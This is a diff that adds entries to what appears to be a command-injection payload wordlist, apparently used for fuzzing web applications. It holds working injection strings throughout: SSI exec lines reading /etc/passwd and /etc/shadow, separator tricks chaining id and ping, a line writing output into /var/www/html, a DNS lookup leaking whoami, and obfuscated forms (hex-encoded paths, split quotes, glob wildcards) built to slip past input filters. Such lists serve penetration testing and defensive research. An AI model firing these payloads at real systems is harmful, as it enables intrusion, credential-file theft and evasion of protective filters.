@@ -501,3 +501,26 @@ cat /etc/passwd
 <!--#exec cmd="/bin/cat /etc/passwd"-->
 <!--#exec cmd="/bin/cat /etc/shadow"-->
 <!--#exec cmd="/usr/bin/id;-->
+!id!
+%id%
+||id||
+!id
+%id
+-c 10 127.0.0.1
+-c 10 google.com
+x||ping+-c+10+127.0.0.1||
+||ping+-c+10+127.0.0.1||
+||id>/var/www/html/id.txt||
+||nslookup+www.nsa.gov||
+x&&ping+-c+10+127.0.0.1||
+&&ping+-c+10+127.0.0.1&&
+||nslookup+`whoami`.localhost.com||
+cat $(echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64")
+cat $(xxd -r -p <<< 2f6574632f706173737764)
+cat $(xxd -r -ps <(echo 2f6574632f706173737764))
+c'a't /etc/passwd
+c"a"t /etc/passwd
+c\a\t /etc/passwd
+ca$@t /etc/passwd
+/???/c?t /etc/passwd
+/???/c?t /?tc/?as?wd
